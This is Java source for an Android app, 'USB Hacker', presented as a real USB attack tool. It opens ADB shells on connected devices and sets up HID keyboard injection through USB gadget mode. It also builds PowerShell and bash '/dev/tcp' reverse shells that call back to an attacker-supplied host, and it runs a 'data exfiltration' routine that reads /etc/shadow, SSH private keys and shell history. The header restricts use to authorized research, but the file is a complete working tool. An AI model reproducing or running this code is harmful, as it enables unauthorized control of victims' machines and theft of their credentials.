/*
 * USB Hacker - Android USB Attack Tool
 * Author: Agent Zero
 * Date: 2026-01-22
 * Description: Real USB attack implementation for Android
 *
 * WARNING: For authorized security research only
 * Unauthorized use against systems you don't own is illegal
 */

package com.offsec.usbhacker;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.hardware.usb.UsbConstants;
import android.hardware.usb.UsbDevice;
import android.hardware.usb.UsbDeviceConnection;
import android.hardware.usb.UsbEndpoint;
import android.hardware.usb.UsbInterface;
import android.hardware.usb.UsbManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ScrollView;
import android.widget.Spinner;
import android.widget.ArrayAdapter;
import android.widget.TextView;
import android.view.View;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class USBHackerApp extends Activity {
    
    private static final String ACTION_USB_PERMISSION = "com.offsec.usbhacker.USB_PERMISSION";
    
    // ADB Protocol Constants
    private static final int A_CNXN = 0x4e584e43;  // CNXN
    private static final int A_OPEN = 0x4e45504f;  // OPEN
    private static final int A_OKAY = 0x59414b4f;  // OKAY
    private static final int A_CLSE = 0x45534c43;  // CLSE
    private static final int A_WRTE = 0x45545257;  // WRTE
    private static final int ADB_VERSION = 0x01000000;
    private static final int MAX_PAYLOAD = 4096;
    
    // USB HID Report Descriptor for Keyboard
    private static final byte[] HID_KEYBOARD_REPORT_DESC = {
        0x05, 0x01,        // Usage Page (Generic Desktop)
        0x09, 0x06,        // Usage (Keyboard)
        (byte)0xA1, 0x01,  // Collection (Application)
        0x05, 0x07,        // Usage Page (Key Codes)
        0x19, (byte)0xE0,  // Usage Minimum (224)
        0x29, (byte)0xE7,  // Usage Maximum (231)
        0x15, 0x00,        // Logical Minimum (0)
        0x25, 0x01,        // Logical Maximum (1)
        0x75, 0x01,        // Report Size (1)
        (byte)0x95, 0x08,  // Report Count (8)
        (byte)0x81, 0x02,  // Input (Data, Variable, Absolute)
        (byte)0x95, 0x01,  // Report Count (1)
        0x75, 0x08,        // Report Size (8)
        (byte)0x81, 0x01,  // Input (Constant)
        (byte)0x95, 0x06,  // Report Count (6)
        0x75, 0x08,        // Report Size (8)
        0x15, 0x00,        // Logical Minimum (0)
        0x25, 0x65,        // Logical Maximum (101)
        0x05, 0x07,        // Usage Page (Key Codes)
        0x19, 0x00,        // Usage Minimum (0)
        0x29, 0x65,        // Usage Maximum (101)
        (byte)0x81, 0x00,  // Input (Data, Array)
        (byte)0xC0         // End Collection
    };
    
    // HID Keyboard Scan Codes
    private static final int[] CHAR_TO_SCANCODE = new int[128];
    private static final boolean[] CHAR_NEEDS_SHIFT = new boolean[128];
    
    static {
        // Initialize scan code mappings
        // Letters a-z
        for (int i = 0; i < 26; i++) {
            CHAR_TO_SCANCODE['a' + i] = 0x04 + i;
            CHAR_TO_SCANCODE['A' + i] = 0x04 + i;
            CHAR_NEEDS_SHIFT['A' + i] = true;
        }
        // Numbers 1-9, 0
        CHAR_TO_SCANCODE['1'] = 0x1E; CHAR_TO_SCANCODE['!'] = 0x1E; CHAR_NEEDS_SHIFT['!'] = true;
        CHAR_TO_SCANCODE['2'] = 0x1F; CHAR_TO_SCANCODE['@'] = 0x1F; CHAR_NEEDS_SHIFT['@'] = true;
        CHAR_TO_SCANCODE['3'] = 0x20; CHAR_TO_SCANCODE['#'] = 0x20; CHAR_NEEDS_SHIFT['#'] = true;
        CHAR_TO_SCANCODE['4'] = 0x21; CHAR_TO_SCANCODE['$'] = 0x21; CHAR_NEEDS_SHIFT['$'] = true;
        CHAR_TO_SCANCODE['5'] = 0x22; CHAR_TO_SCANCODE['%'] = 0x22; CHAR_NEEDS_SHIFT['%'] = true;
        CHAR_TO_SCANCODE['6'] = 0x23; CHAR_TO_SCANCODE['^'] = 0x23; CHAR_NEEDS_SHIFT['^'] = true;
        CHAR_TO_SCANCODE['7'] = 0x24; CHAR_TO_SCANCODE['&'] = 0x24; CHAR_NEEDS_SHIFT['&'] = true;
        CHAR_TO_SCANCODE['8'] = 0x25; CHAR_TO_SCANCODE['*'] = 0x25; CHAR_NEEDS_SHIFT['*'] = true;
        CHAR_TO_SCANCODE['9'] = 0x26; CHAR_TO_SCANCODE['('] = 0x26; CHAR_NEEDS_SHIFT['('] = true;
        CHAR_TO_SCANCODE['0'] = 0x27; CHAR_TO_SCANCODE[')'] = 0x27; CHAR_NEEDS_SHIFT[')'] = true;
        // Special characters
        CHAR_TO_SCANCODE[' '] = 0x2C;
        CHAR_TO_SCANCODE['-'] = 0x2D; CHAR_TO_SCANCODE['_'] = 0x2D; CHAR_NEEDS_SHIFT['_'] = true;
        CHAR_TO_SCANCODE['='] = 0x2E; CHAR_TO_SCANCODE['+'] = 0x2E; CHAR_NEEDS_SHIFT['+'] = true;
        CHAR_TO_SCANCODE['['] = 0x2F; CHAR_TO_SCANCODE['{'] = 0x2F; CHAR_NEEDS_SHIFT['{'] = true;
        CHAR_TO_SCANCODE[']'] = 0x30; CHAR_TO_SCANCODE['}'] = 0x30; CHAR_NEEDS_SHIFT['}'] = true;
        CHAR_TO_SCANCODE['\\'] = 0x31; CHAR_TO_SCANCODE['|'] = 0x31; CHAR_NEEDS_SHIFT['|'] = true;
        CHAR_TO_SCANCODE[';'] = 0x33; CHAR_TO_SCANCODE[':'] = 0x33; CHAR_NEEDS_SHIFT[':'] = true;
        CHAR_TO_SCANCODE['\''] = 0x34; CHAR_TO_SCANCODE['"'] = 0x34; CHAR_NEEDS_SHIFT['"'] = true;
        CHAR_TO_SCANCODE['`'] = 0x35; CHAR_TO_SCANCODE['~'] = 0x35; CHAR_NEEDS_SHIFT['~'] = true;
        CHAR_TO_SCANCODE[','] = 0x36; CHAR_TO_SCANCODE['<'] = 0x36; CHAR_NEEDS_SHIFT['<'] = true;
        CHAR_TO_SCANCODE['.'] = 0x37; CHAR_TO_SCANCODE['>'] = 0x37; CHAR_NEEDS_SHIFT['>'] = true;
        CHAR_TO_SCANCODE['/'] = 0x38; CHAR_TO_SCANCODE['?'] = 0x38; CHAR_NEEDS_SHIFT['?'] = true;
        CHAR_TO_SCANCODE['\n'] = 0x28; // Enter
        CHAR_TO_SCANCODE['\t'] = 0x2B; // Tab
    }
    
    // Modifier keys
    private static final byte MOD_NONE = 0x00;
    private static final byte MOD_CTRL = 0x01;
    private static final byte MOD_SHIFT = 0x02;
    private static final byte MOD_ALT = 0x04;
    private static final byte MOD_GUI = 0x08;  // Windows/Command key
    
    private UsbManager usbManager;
    private TextView statusView;
    private TextView deviceInfo;
    private TextView logView;
    private ScrollView logScroll;
    private EditText commandInput;
    private Spinner attackModeSpinner;
    private Button scanButton;
    private Button attackButton;
    private Button stopButton;
    
    private UsbDevice targetDevice;
    private UsbDeviceConnection usbConnection;
    private UsbEndpoint endpointIn;
    private UsbEndpoint endpointOut;
    
    private ExecutorService executor;
    private Handler mainHandler;
    private volatile boolean isAttacking = false;
    private boolean hasRoot = false;
    
    private final BroadcastReceiver usbReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            if (ACTION_USB_PERMISSION.equals(action)) {
                synchronized (this) {
                    UsbDevice device = intent.getParcelableExtra(UsbManager.EXTRA_DEVICE);
                    if (intent.getBooleanExtra(UsbManager.EXTRA_PERMISSION_GRANTED, false)) {
                        if (device != null) {
                            log("[+] USB permission granted for " + device.getDeviceName());
                            targetDevice = device;
                            connectToDevice();
                        }
                    } else {
                        log("[-] USB permission denied");
                    }
                }
            } else if (UsbManager.ACTION_USB_DEVICE_ATTACHED.equals(action)) {
                log("[*] USB device attached");
                scanUSBDevices();
            } else if (UsbManager.ACTION_USB_DEVICE_DETACHED.equals(action)) {
                log("[*] USB device detached");
                disconnectDevice();
            }
        }
    };
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        // Initialize components
        statusView = findViewById(R.id.statusView);
        deviceInfo = findViewById(R.id.deviceInfo);
        logView = findViewById(R.id.logView);
        logScroll = findViewById(R.id.logScroll);
        commandInput = findViewById(R.id.commandInput);
        attackModeSpinner = findViewById(R.id.attackModeSpinner);
        scanButton = findViewById(R.id.scanButton);
        attackButton = findViewById(R.id.attackButton);
        stopButton = findViewById(R.id.stopButton);
        
        // Initialize USB manager
        usbManager = (UsbManager) getSystemService(Context.USB_SERVICE);
        
        // Initialize executor and handler
        executor = Executors.newSingleThreadExecutor();
        mainHandler = new Handler(Looper.getMainLooper());
        
        // Setup attack mode spinner
        String[] attackModes = {
            "ADB Shell Command",
            "HID Keyboard Injection",
            "Reverse Shell (Windows)",
            "Reverse Shell (Linux)",
            "Data Exfiltration"
        };
        ArrayAdapter<String> adapter = new ArrayAdapter<>(this, 
            android.R.layout.simple_spinner_item, attackModes);
        adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        attackModeSpinner.setAdapter(adapter);
        
        // Setup button listeners
        scanButton.setOnClickListener(v -> scanUSBDevices());
        attackButton.setOnClickListener(v -> executeAttack());
        stopButton.setOnClickListener(v -> stopAttack());
        stopButton.setEnabled(false);
        
        // Check for root access
        checkRootAccess();
        
        // Register USB receiver
        IntentFilter filter = new IntentFilter();
        filter.addAction(ACTION_USB_PERMISSION);
        filter.addAction(UsbManager.ACTION_USB_DEVICE_ATTACHED);
        filter.addAction(UsbManager.ACTION_USB_DEVICE_DETACHED);
        registerReceiver(usbReceiver, filter);
        
        log("[*] USB Hacker initialized");
        log("[*] Root access: " + (hasRoot ? "Yes" : "No"));
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        unregisterReceiver(usbReceiver);
        disconnectDevice();
        executor.shutdown();
    }
    
    private void checkRootAccess() {
        try {
            Process process = Runtime.getRuntime().exec("su -c id");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line = reader.readLine();
            hasRoot = line != null && line.contains("uid=0");
            process.waitFor();
        } catch (Exception e) {
            hasRoot = false;
        }
    }
    
    private void log(String message) {
        mainHandler.post(() -> {
            logView.append(message + "\n");
            logScroll.fullScroll(View.FOCUS_DOWN);
        });
    }
    
    private void setStatus(String status) {
        mainHandler.post(() -> statusView.setText(status));
    }
    
    private void scanUSBDevices() {
        log("[*] Scanning for USB devices...");
        setStatus("Scanning...");
        
        HashMap<String, UsbDevice> deviceList = usbManager.getDeviceList();
        
        if (deviceList.isEmpty()) {
            log("[-] No USB devices found");
            setStatus("No devices found");
            deviceInfo.setText("No USB devices connected");
            return;
        }
        
        StringBuilder info = new StringBuilder();
        List<UsbDevice> targetDevices = new ArrayList<>();
        
        for (UsbDevice device : deviceList.values()) {
            info.append("Device: ").append(device.getDeviceName()).append("\n");
            info.append("  Vendor ID: 0x").append(String.format("%04X", device.getVendorId())).append("\n");
            info.append("  Product ID: 0x").append(String.format("%04X", device.getProductId())).append("\n");
            info.append("  Class: ").append(getUsbClassName(device.getDeviceClass())).append("\n");
            info.append("  Interfaces: ").append(device.getInterfaceCount()).append("\n");
            
            // Check for ADB interface (Class 255, Subclass 66, Protocol 1)
            for (int i = 0; i < device.getInterfaceCount(); i++) {
                UsbInterface iface = device.getInterface(i);
                if (iface.getInterfaceClass() == 255 && 
                    iface.getInterfaceSubclass() == 66 && 
                    iface.getInterfaceProtocol() == 1) {
                    info.append("  [!] ADB Interface detected!\n");
                    targetDevices.add(device);
                }
            }
            info.append("\n");
        }
        
        deviceInfo.setText(info.toString());
        log("[+] Found " + deviceList.size() + " USB device(s)");
        
        if (!targetDevices.isEmpty()) {
            UsbDevice device = targetDevices.get(0);
            log("[+] Target device found: " + device.getDeviceName());
            requestUsbPermission(device);
        }
        
        setStatus("Scan complete - " + deviceList.size() + " devices");
    }
    
    private String getUsbClassName(int usbClass) {
        switch (usbClass) {
            case UsbConstants.USB_CLASS_APP_SPEC: return "Application Specific";
            case UsbConstants.USB_CLASS_AUDIO: return "Audio";
            case UsbConstants.USB_CLASS_CDC_DATA: return "CDC Data";
            case UsbConstants.USB_CLASS_COMM: return "Communication";
            case UsbConstants.USB_CLASS_CONTENT_SEC: return "Content Security";
            case UsbConstants.USB_CLASS_CSCID: return "Smart Card";
            case UsbConstants.USB_CLASS_HID: return "HID";
            case UsbConstants.USB_CLASS_HUB: return "Hub";
            case UsbConstants.USB_CLASS_MASS_STORAGE: return "Mass Storage";
            case UsbConstants.USB_CLASS_MISC: return "Miscellaneous";
            case UsbConstants.USB_CLASS_PER_INTERFACE: return "Per Interface";
            case UsbConstants.USB_CLASS_PHYSICA: return "Physical";
            case UsbConstants.USB_CLASS_PRINTER: return "Printer";
            case UsbConstants.USB_CLASS_STILL_IMAGE: return "Still Image";
            case UsbConstants.USB_CLASS_VENDOR_SPEC: return "Vendor Specific";
            case UsbConstants.USB_CLASS_VIDEO: return "Video";
            case UsbConstants.USB_CLASS_WIRELESS_CONTROLLER: return "Wireless";
            default: return "Unknown (" + usbClass + ")";
        }
    }
    
    private void requestUsbPermission(UsbDevice device) {
        PendingIntent permissionIntent = PendingIntent.getBroadcast(
            this, 0, new Intent(ACTION_USB_PERMISSION), PendingIntent.FLAG_UPDATE_CURRENT);
        usbManager.requestPermission(device, permissionIntent);
        log("[*] Requesting USB permission...");
    }
    
    private void connectToDevice() {
        if (targetDevice == null) {
            log("[-] No target device");
            return;
        }
        
        // Find ADB interface
        UsbInterface adbInterface = null;
        for (int i = 0; i < targetDevice.getInterfaceCount(); i++) {
            UsbInterface iface = targetDevice.getInterface(i);
            if (iface.getInterfaceClass() == 255 && 
                iface.getInterfaceSubclass() == 66 && 
                iface.getInterfaceProtocol() == 1) {
                adbInterface = iface;
                break;
            }
        }
        
        if (adbInterface == null) {
            log("[-] ADB interface not found");
            return;
        }
        
        // Open connection
        usbConnection = usbManager.openDevice(targetDevice);
        if (usbConnection == null) {
            log("[-] Failed to open USB connection");
            return;
        }
        
        if (!usbConnection.claimInterface(adbInterface, true)) {
            log("[-] Failed to claim interface");
            usbConnection.close();
            return;
        }
        
        // Find endpoints
        for (int i = 0; i < adbInterface.getEndpointCount(); i++) {
            UsbEndpoint endpoint = adbInterface.getEndpoint(i);
            if (endpoint.getType() == UsbConstants.USB_ENDPOINT_XFER_BULK) {
                if (endpoint.getDirection() == UsbConstants.USB_DIR_IN) {
                    endpointIn = endpoint;
                } else {
                    endpointOut = endpoint;
                }
            }
        }
        
        if (endpointIn != null && endpointOut != null) {
            log("[+] Connected to ADB interface");
            attackButton.setEnabled(true);
            setStatus("Connected");
            
            // Start ADB handshake
            executor.execute(this::performAdbHandshake);
        } else {
            log("[-] Failed to find bulk endpoints");
            disconnectDevice();
        }
    }
    
    private void disconnectDevice() {
        if (usbConnection != null) {
            usbConnection.close();
            usbConnection = null;
        }
        targetDevice = null;
        endpointIn = null;
        endpointOut = null;
        mainHandler.post(() -> attackButton.setEnabled(false));
        log("[*] Disconnected from device");
    }
    
    private void performAdbHandshake() {
        try {
            // Send CNXN message
            String systemIdentity = "host::features=cmd,shell_v2";
            byte[] cnxnPayload = systemIdentity.getBytes();
            
            byte[] cnxnMessage = createAdbMessage(A_CNXN, ADB_VERSION, MAX_PAYLOAD, cnxnPayload);
            int sent = usbConnection.bulkTransfer(endpointOut, cnxnMessage, cnxnMessage.length, 5000);
            
            if (sent > 0) {
                log("[+] Sent CNXN message (" + sent + " bytes)");
                
                // Read response
                byte[] response = new byte[24 + MAX_PAYLOAD];
                int received = usbConnection.bulkTransfer(endpointIn, response, response.length, 5000);
                
                if (received > 0) {
                    int command = ByteBuffer.wrap(response, 0, 4).order(ByteOrder.LITTLE_ENDIAN).getInt();
                    if (command == A_CNXN) {
                        log("[+] Received CNXN response - ADB connected!");
                        setStatus("ADB Connected");
                    } else {
                        log("[*] Received response: 0x" + String.format("%08X", command));
                    }
                }
            }
        } catch (Exception e) {
            log("[-] ADB handshake failed: " + e.getMessage());
        }
    }
    
    private byte[] createAdbMessage(int command, int arg0, int arg1, byte[] payload) {
        int payloadLength = payload != null ? payload.length : 0;
        ByteBuffer buffer = ByteBuffer.allocate(24 + payloadLength);
        buffer.order(ByteOrder.LITTLE_ENDIAN);
        
        buffer.putInt(command);
        buffer.putInt(arg0);
        buffer.putInt(arg1);
        buffer.putInt(payloadLength);
        buffer.putInt(calculateChecksum(payload));
        buffer.putInt(command ^ 0xFFFFFFFF);  // Magic
        
        if (payload != null) {
            buffer.put(payload);
        }
        
        return buffer.array();
    }
    
    private int calculateChecksum(byte[] data) {
        if (data == null) return 0;
        int sum = 0;
        for (byte b : data) {
            sum += (b & 0xFF);
        }
        return sum;
    }
    
    private void executeAttack() {
        if (isAttacking) {
            log("[-] Attack already in progress");
            return;
        }
        
        String command = commandInput.getText().toString().trim();
        int attackMode = attackModeSpinner.getSelectedItemPosition();
        
        if (command.isEmpty() && attackMode == 0) {
            log("[-] Please enter a command");
            return;
        }
        
        isAttacking = true;
        attackButton.setEnabled(false);
        stopButton.setEnabled(true);
        setStatus("Attacking...");
        
        executor.execute(() -> {
            try {
                switch (attackMode) {
                    case 0: // ADB Shell Command
                        executeAdbCommand(command);
                        break;
                    case 1: // HID Keyboard Injection
                        executeHidInjection(command);
                        break;
                    case 2: // Reverse Shell (Windows)
                        executeWindowsReverseShell(command);
                        break;
                    case 3: // Reverse Shell (Linux)
                        executeLinuxReverseShell(command);
                        break;
                    case 4: // Data Exfiltration
                        executeDataExfiltration();
                        break;
                }
            } catch (Exception e) {
                log("[-] Attack failed: " + e.getMessage());
            } finally {
                isAttacking = false;
                mainHandler.post(() -> {
                    attackButton.setEnabled(true);
                    stopButton.setEnabled(false);
                    setStatus("Attack complete");
                });
            }
        });
    }
    
    private void executeAdbCommand(String command) {
        if (usbConnection == null) {
            log("[-] Not connected to device");
            return;
        }
        
        log("[*] Executing ADB command: " + command);
        
        try {
            // Open shell stream
            String destination = "shell:" + command;
            byte[] openPayload = destination.getBytes();
            byte[] openMessage = createAdbMessage(A_OPEN, 1, 0, openPayload);
            
            int sent = usbConnection.bulkTransfer(endpointOut, openMessage, openMessage.length, 5000);
            log("[+] Sent OPEN message (" + sent + " bytes)");
            
            // Read response
            byte[] response = new byte[24 + MAX_PAYLOAD];
            int received = usbConnection.bulkTransfer(endpointIn, response, response.length, 5000);
            
            if (received > 0) {
                int cmd = ByteBuffer.wrap(response, 0, 4).order(ByteOrder.LITTLE_ENDIAN).getInt();
                
                if (cmd == A_OKAY) {
                    log("[+] Shell opened successfully");
                    
                    // Read command output
                    while (isAttacking) {
                        received = usbConnection.bulkTransfer(endpointIn, response, response.length, 1000);
                        if (received > 24) {
                            int dataCmd = ByteBuffer.wrap(response, 0, 4).order(ByteOrder.LITTLE_ENDIAN).getInt();
                            int dataLen = ByteBuffer.wrap(response, 12, 4).order(ByteOrder.LITTLE_ENDIAN).getInt();
                            
                            if (dataCmd == A_WRTE && dataLen > 0) {
                                String output = new String(response, 24, dataLen);
                                log("[OUTPUT] " + output);
                            } else if (dataCmd == A_CLSE) {
                                log("[*] Shell closed");
                                break;
                            }
                        } else if (received <= 0) {
                            break;
                        }
                    }
                } else {
                    log("[-] Failed to open shell: 0x" + String.format("%08X", cmd));
                }
            }
        } catch (Exception e) {
            log("[-] ADB command failed: " + e.getMessage());
        }
    }
    
    private void executeHidInjection(String payload) {
        if (!hasRoot) {
            log("[-] HID injection requires root access");
            return;
        }
        
        log("[*] Starting HID keyboard injection...");
        
        try {
            // Setup USB gadget mode
            if (!setupUsbGadget()) {
                log("[-] Failed to setup USB gadget mode");
                return;
            }
            
            // Type the payload
            for (char c : payload.toCharArray()) {
                if (!isAttacking) break;
                
                sendKeystroke(c);
                Thread.sleep(50);  // Delay between keystrokes
            }
            
            // Press Enter
            sendKeystroke('\n');
            
            log("[+] HID injection complete");
            
        } catch (Exception e) {
            log("[-] HID injection failed: " + e.getMessage());
        }
    }
    
    private boolean setupUsbGadget() {
        try {
            // Check if ConfigFS is available
            String[] commands = {
                "mount -t configfs none /config 2>/dev/null || true",
                "mkdir -p /config/usb_gadget/g1",
                "echo 0x1d6b > /config/usb_gadget/g1/idVendor",
                "echo 0x0104 > /config/usb_gadget/g1/idProduct",
                "mkdir -p /config/usb_gadget/g1/strings/0x409",
                "echo 'USB Gadget' > /config/usb_gadget/g1/strings/0x409/product",
                "mkdir -p /config/usb_gadget/g1/configs/c.1",
                "mkdir -p /config/usb_gadget/g1/functions/hid.usb0",
                "echo 1 > /config/usb_gadget/g1/functions/hid.usb0/protocol",
                "echo 1 > /config/usb_gadget/g1/functions/hid.usb0/subclass",
                "echo 8 > /config/usb_gadget/g1/functions/hid.usb0/report_length",
                "ln -sf /config/usb_gadget/g1/functions/hid.usb0 /config/usb_gadget/g1/configs/c.1/"
            };
            
            for (String cmd : commands) {
                Process process = Runtime.getRuntime().exec("su -c " + cmd);
                process.waitFor();
            }
            
            log("[+] USB gadget configured");
            return true;
            
        } catch (Exception e) {
            log("[-] Gadget setup error: " + e.getMessage());
            return false;
        }
    }
    
    private void sendKeystroke(char c) {
        if (c >= 128) return;
        
        int scancode = CHAR_TO_SCANCODE[c];
        byte modifier = CHAR_NEEDS_SHIFT[c] ? MOD_SHIFT : MOD_NONE;
        
        try {
            // HID report: [modifier, reserved, key1, key2, key3, key4, key5, key6]
            byte[] report = new byte[8];
            report[0] = modifier;
            report[2] = (byte) scancode;
            
            // Write key down
            Process process = Runtime.getRuntime().exec("su -c cat > /dev/hidg0");
            DataOutputStream os = new DataOutputStream(process.getOutputStream());
            os.write(report);
            os.flush();
            
            // Release key
            report[0] = 0;
            report[2] = 0;
            os.write(report);
            os.flush();
            os.close();
            process.waitFor();
            
        } catch (Exception e) {
            log("[-] Keystroke error: " + e.getMessage());
        }
    }
    
    private void executeWindowsReverseShell(String lhostLport) {
        String[] parts = lhostLport.split(":");
        if (parts.length != 2) {
            log("[-] Invalid format. Use: LHOST:LPORT");
            return;
        }
        
        String lhost = parts[0];
        String lport = parts[1];
        
        String payload = String.format(
            "powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('%s',%s);" +
            "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};" +
            "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){" +
            "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);" +
            "$sendback = (iex $data 2>&1 | Out-String );" +
            "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';" +
            "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);" +
            "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}\"",
            lhost, lport
        );
        
        log("[*] Injecting Windows reverse shell to " + lhost + ":" + lport);
        
        // Use HID injection to type the payload
        executeHidInjection("cmd\n");
        try { Thread.sleep(1000); } catch (Exception e) {}
        executeHidInjection(payload);
    }
    
    private void executeLinuxReverseShell(String lhostLport) {
        String[] parts = lhostLport.split(":");
        if (parts.length != 2) {
            log("[-] Invalid format. Use: LHOST:LPORT");
            return;
        }
        
        String payload = String.format("bash -i >& /dev/tcp/%s/%s 0>&1", parts[0], parts[1]);
        
        log("[*] Injecting Linux reverse shell to " + lhostLport);
        executeHidInjection(payload);
    }
    
    private void executeDataExfiltration() {
        log("[*] Starting data exfiltration...");
        
        String[] commands = {
            "cat /etc/passwd",
            "cat /etc/shadow 2>/dev/null",
            "ls -la /home",
            "cat ~/.ssh/id_rsa 2>/dev/null",
            "cat ~/.bash_history 2>/dev/null",
            "ifconfig || ip addr",
            "netstat -tlnp || ss -tlnp"
        };
        
        for (String cmd : commands) {
            if (!isAttacking) break;
            executeAdbCommand(cmd);
            try { Thread.sleep(500); } catch (Exception e) {}
        }
        
        log("[+] Data exfiltration complete");
    }
    
    private void stopAttack() {
        log("[*] Stopping attack...");
        isAttacking = false;
    }
}
